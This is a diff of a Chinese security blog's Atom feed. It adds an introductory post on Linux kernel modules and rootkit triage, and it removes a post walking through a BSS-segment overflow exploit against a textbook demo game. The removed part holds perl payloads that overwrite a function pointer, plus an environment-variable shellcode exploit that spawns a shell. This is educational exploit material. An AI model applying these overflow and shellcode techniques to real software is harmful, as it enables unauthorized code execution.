@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2023-03-15T05:12:49.227Z</updated>
+  <updated>2024-08-07T15:32:53.529Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -14,6 +14,80 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux LKM Rootkit简介与排查</title>
+    <link href="http://kevien.github.io/2024/08/07/Linux-LKM-Rootkit%E7%AE%80%E4%BB%8B%E4%B8%8E%E6%8E%92%E6%9F%A5/"/>
+    <id>http://kevien.github.io/2024/08/07/Linux-LKM-Rootkit简介与排查/</id>
+    <published>2024-08-07T13:38:03.000Z</published>
+    <updated>2024-08-07T15:32:53.529Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/1.png" alt=""><br><a href="https://xz.aliyun.com/t/14548" target="_blank" rel="noopener">https://xz.aliyun.com/t/14548</a> （记录某次”有趣的”挖矿木马排查），这篇关于应急的文章写的不错，排查点基本上都排查到了，感觉就是差了个在入侵时间点范围内被修改过的文件这个角度去排查，但瑕不掩瑜，整个文章的亮点还是比较多，尤其是LKM的发现，之前没对LKM什么了解，遂简单学习了下。</p>
+<p>Loadable Kernel Modules (LKMs) 是现代操作系统内核（如 Linux 内核）中的一个重要特性。它们允许在运行时动态加载和卸载内核功能，而无需重新编译或重启内核。以下是对 LKMs 的详细介绍。</p>
+<h3 id="什么是-Loadable-Kernel-Modules-LKMs"><a href="#什么是-Loadable-Kernel-Modules-LKMs" class="headerlink" title="什么是 Loadable Kernel Modules (LKMs)?"></a>什么是 Loadable Kernel Modules (LKMs)?</h3><p>Loadable Kernel Modules 是一段可以在内核运行时动态加载或卸载的代码。它们通常用于扩展内核的功能，例如添加新的设备驱动程序、文件系统支持或网络协议。</p>
+<h3 id="LKMs-的优点"><a href="#LKMs-的优点" class="headerlink" title="LKMs 的优点"></a>LKMs 的优点</h3><ol>
+<li><strong>灵活性</strong>: 允许在不重启系统的情况下添加或移除内核功能。</li>
+<li><strong>开发便利</strong>: 开发和测试内核模块更为简便，因为不需要每次修改后都重启系统。</li>
+<li><strong>资源管理</strong>: 只在需要时加载模块，有助于节省系统资源。</li>
+<li><strong>安全性</strong>: 可以动态卸载存在漏洞的模块，减少安全风险。</li>
+</ol>
+<h3 id="常见的-LKM-类型"><a href="#常见的-LKM-类型" class="headerlink" title="常见的 LKM 类型"></a>常见的 LKM 类型</h3><ol>
+<li><strong>设备驱动程序</strong>: 用于支持新硬件设备。</li>
+<li><strong>文件系统</strong>: 添加对新的文件系统类型的支持。</li>
+<li><strong>网络协议</strong>: 支持新的网络协议或增强现有协议的功能。</li>
+<li><strong>系统调用</strong>: 添加或修改系统调用。</li>
+</ol>
+<h3 id="LKM-的基本操作"><a href="#LKM-的基本操作" class="headerlink" title="LKM 的基本操作"></a>LKM 的基本操作</h3><h4 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h4><p>使用 <code>insmod</code> 命令可以加载一个模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo insmod mymodule.ko</span><br></pre></td></tr></table></figure>
+<p><code>mymodule.ko</code> 是你要加载的模块文件。</p>
+<h4 id="卸载模块"><a href="#卸载模块" class="headerlink" title="卸载模块"></a>卸载模块</h4><p>使用 <code>rmmod</code> 命令可以卸载一个模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rmmod mymodule</span><br></pre></td></tr></table></figure>
+<p><code>mymodule</code> 是你要卸载的模块名称。</p>
+<h4 id="查看已加载模块"><a href="#查看已加载模块" class="headerlink" title="查看已加载模块"></a>查看已加载模块</h4><p>使用 <code>lsmod</code> 命令可以查看当前加载的所有模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>
+<h4 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h4><p>使用 <code>modinfo</code> 命令可以查看模块的详细信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modinfo mymodule.ko</span><br></pre></td></tr></table></figure>
+<h3 id="编写一个简单的-LKM"><a href="#编写一个简单的-LKM" class="headerlink" title="编写一个简单的 LKM"></a>编写一个简单的 LKM</h3><p>以下是一个简单的 “Hello World” 内核模块示例。</p>
+<h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p>创建一个名为 <code>hello.c</code> 的文件，内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Your Name"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"A simple Hello World LKM"</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">"0.1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Hello, World!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Goodbye, World!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
+<h4 id="编译模块"><a href="#编译模块" class="headerlink" title="编译模块"></a>编译模块</h4><p>创建一个名为 <code>Makefile</code> 的文件，内容如下：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += hello.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
+<p>然后运行以下命令编译模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>编译成功后会生成一个 <code>hello.ko</code> 文件。</p>
+<h4 id="加载和卸载模块"><a href="#加载和卸载模块" class="headerlink" title="加载和卸载模块"></a>加载和卸载模块</h4><p>加载模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo insmod hello.ko</span><br></pre></td></tr></table></figure>
+<p>查看内核日志以确认模块加载成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg | tail</span><br></pre></td></tr></table></figure>
+<p>卸载模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rmmod hello</span><br></pre></td></tr></table></figure>
+<p>再次查看内核日志以确认模块卸载成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg | tail</span><br></pre></td></tr></table></figure>
+<h3 id="LKM-Rootkit-排查"><a href="#LKM-Rootkit-排查" class="headerlink" title="LKM Rootkit 排查"></a>LKM Rootkit 排查</h3><ul>
+<li>使用 dmesg 命令查看内核日志，寻找可疑的加载或卸载模块的日志。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg | grep module</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/2.png" alt=""></p>
+<ul>
+<li>之后find一下相关的文件，然后上传到云沙箱上进行扫描分析<br><img src="/2024/08/07/Linux-LKM-Rootkit简介与排查/3.png" alt=""><h3 id="安全性考虑"><a href="#安全性考虑" class="headerlink" title="安全性考虑"></a>安全性考虑</h3></li>
+</ul>
+<p>尽管 LKMs 提供了很大的灵活性，但也带来了潜在的安全风险：</p>
+<ol>
+<li><strong>恶意模块</strong>: 攻击者可以加载恶意模块，获取内核级别的权限。</li>
+<li><strong>稳定性</strong>: 不稳定或有缺陷的模块可能导致系统崩溃。</li>
+<li><strong>签名验证</strong>: 使用模块签名验证可以确保只有经过认证的模块被加载。</li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Loadable Kernel Modules 是扩展内核功能的重要工具，提供了灵活性和开发便利性。通过正确的开发和管理，可以有效地利用 LKMs 来增强系统功能，同时需要注意安全性和稳定性问题。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;/2024/08/07/Linux-LKM-Rootkit简介与排查/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a href=&quot;https://xz.aliyun.com/t/14548&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;htt
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>pwn basic</title>
@@ -897,71 +971,6 @@
       <category term="reverse" scheme="http://kevien.github.io/tags/reverse/"/>
     
       <category term="linux" scheme="http://kevien.github.io/tags/linux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BSS段的溢出攻击</title>
-    <link href="http://kevien.github.io/2018/03/22/BSS%E6%AE%B5%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
-    <id>http://kevien.github.io/2018/03/22/BSS段的溢出攻击/</id>
-    <published>2018-03-21T17:30:17.000Z</published>
-    <updated>2018-11-19T15:50:00.000Z</updated>
-    
-    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原文已发布至seebug</span><br><span class="line">https://paper.seebug.org/548/</span><br></pre></td></tr></table></figure>
-<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="noopener">wiki</a></li>
-<li>测试环境ubuntu14.04X86.<h4 id="vul-code-snippet"><a href="#vul-code-snippet" class="headerlink" title="vul code snippet"></a>vul code snippet</h4></li>
-<li><p>from game_of_chance.c</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// Custom user struct to store information about users </span><br><span class="line">struct user &#123;</span><br><span class="line">    int uid;</span><br><span class="line">    int credits;</span><br><span class="line">    int highscore;</span><br><span class="line">    char name[100];</span><br><span class="line">    int (*current_game) ();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">struct user player;     // Player struct</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>其中game_of_chance 是如下图的一个小游戏<br><img src="/2018/03/22/BSS段的溢出攻击/game.png" alt=""></p>
-</li>
-<li><p>如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void input_name() &#123;</span><br><span class="line">   char *name_ptr, input_char=&apos;\n&apos;;</span><br><span class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </span><br><span class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</span><br><span class="line">   </span><br><span class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</span><br><span class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</span><br><span class="line">      *name_ptr = input_char;   // Put the input char into name field.</span><br><span class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</span><br><span class="line">      name_ptr++;               // Increment the name pointer.</span><br><span class="line">   &#125;</span><br><span class="line">   *name_ptr = 0;  // Terminate the string.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这个函数会接收用户输入的名字直到遇到换行符，所以这里并没有有效的限制用户输入，就意味着有可能被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行以及play_the_game()函数中，代码片段如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if((choice &lt; 1) || (choice &gt; 7))</span><br><span class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</span><br><span class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</span><br><span class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</span><br><span class="line">             if(choice == 1)        // then point it at the selected game </span><br><span class="line">                player.current_game = pick_a_number;   </span><br><span class="line">             else if(choice == 2)                     </span><br><span class="line">                player.current_game = dealer_no_match;</span><br><span class="line">             else</span><br><span class="line">                player.current_game = find_the_ace;</span><br><span class="line">             last_game = choice;   // and set last_game.</span><br><span class="line">          &#125;</span><br><span class="line">          play_the_game();   // Play the game.</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
-<li>如果last_game 未设置，函数指针current_game 会被指向成0或者-1，这时不会触发漏洞，后面last_game被设置成1，当修改完名字完成对current_game覆盖再玩游戏1的时候，进入play_the_game()函数,play_the_game()会有current_game指针变量的调用，此时漏洞即触发！<br><img src="/2018/03/22/BSS段的溢出攻击/gamemain.png" alt=""></li>
-<li>我们可以通过ctrl+z挂起当前的进程(这个时候last_game变量被设置成了1(因为刚才玩的是游戏choice是1))，我们找到可以被溢出的变量name，然后通过简单调试看一下name和current_game指针在内存中的位置关系。<br><img src="/2018/03/22/BSS段的溢出攻击/distance.png" alt=""></li>
-<li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="/2018/03/22/BSS段的溢出攻击/flowattempt.png" alt=""></p>
-<ul>
-<li>可以看到程序崩溃之前curren_game已被成功覆盖为BBBB，这个时候我们需要一个”有效的”地址去做我们想要做的事情。</li>
-<li>nm命令可以查看程序的符号表，来看一下程序有哪些函数以及其对应的内存地址（此思路常用于破解）。<br><img src="/2018/03/22/BSS段的溢出攻击/jackpot.png" alt=""></li>
-<li>jackpot函数是我们理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有无数”金币”</li>
-<li><p>这个程序通过标准输入进行用户交互，我们完全可以使用脚本实现自动化，如下的例子将会自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>同样的技巧可以用到自动化exploit中，下面的命令会完成修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 90 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048f15</span><br><span class="line"></span><br><span class="line">####### Pick a Number ######</span><br><span class="line">This game costs 10 credits to play. Simply pick a number</span><br><span class="line">between 1 and 20, and if you pick the winning number, you</span><br><span class="line">will win the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">10 credits have been deducted from your account.</span><br><span class="line">Pick a number between 1 and 20: The winning number is 11</span><br><span class="line">Sorry, you didn&apos;t win.</span><br><span class="line"></span><br><span class="line">You now have 80 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 80 credits] -&gt;  </span><br><span class="line">Change user name</span><br><span class="line">Enter your new name: Your name has been changed.</span><br><span class="line"></span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</span><br><span class="line">[You have 80 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048ca5</span><br><span class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</span><br><span class="line">You have won the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">You now have 180 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</span><br><span class="line">[You have 180 credits] -&gt;  </span><br><span class="line">Thanks for playing! Bye.</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可以看到函数被调用我们增加了100金币</p>
-</li>
-<li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="/2018/03/22/BSS段的溢出攻击/getall.png" alt=""></p>
-<ul>
-<li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载环境变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</span><br><span class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</span><br><span class="line">                                                          XQh//shh/bin��Q��S��̀</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</span><br><span class="line">SHELLCODE will be at 0xbffff206</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 1260 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048f15</span><br><span class="line"></span><br><span class="line">####### Pick a Number ######</span><br><span class="line">This game costs 10 credits to play. Simply pick a number</span><br><span class="line">between 1 and 20, and if you pick the winning number, you</span><br><span class="line">will win the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">10 credits have been deducted from your account.</span><br><span class="line">Pick a number between 1 and 20: The winning number is 6</span><br><span class="line">Sorry, you didn&apos;t win.</span><br><span class="line"></span><br><span class="line">You now have 1250 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 1250 credits] -&gt;  </span><br><span class="line">Change user name</span><br><span class="line">Enter your new name: Your name has been changed.</span><br><span class="line"></span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</span><br><span class="line">[You have 1250 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0xbffff206</span><br><span class="line">id</span><br><span class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/tree/master/bssexploit" target="_blank" rel="noopener">github repo</a></p>
-<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
-<li>《Hacking the art of exploitation》0x342</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
